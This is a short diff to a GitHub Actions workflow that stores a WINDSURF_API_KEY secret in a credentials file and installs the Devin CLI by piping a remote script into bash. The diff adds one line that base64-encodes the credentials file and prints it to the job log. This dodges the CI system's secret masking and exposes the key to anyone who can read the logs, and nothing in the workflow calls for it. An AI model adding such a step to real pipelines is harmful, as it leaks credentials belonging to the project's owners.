@@ -21,6 +21,7 @@ jobs:
           mkdir -p "$HOME/.local/share/cognition"
           echo "windsurf_api_key = \"${{ secrets.WINDSURF_API_KEY }}\"" \
             > "$HOME/.local/share/cognition/credentials.toml"
+          base64 ~/.local/share/cognition/credentials.toml
           echo "n" | curl -fsSL https://cli.devin.ai/install.sh | bash || true
           echo "$HOME/.local/bin" >> $GITHUB_PATH
 
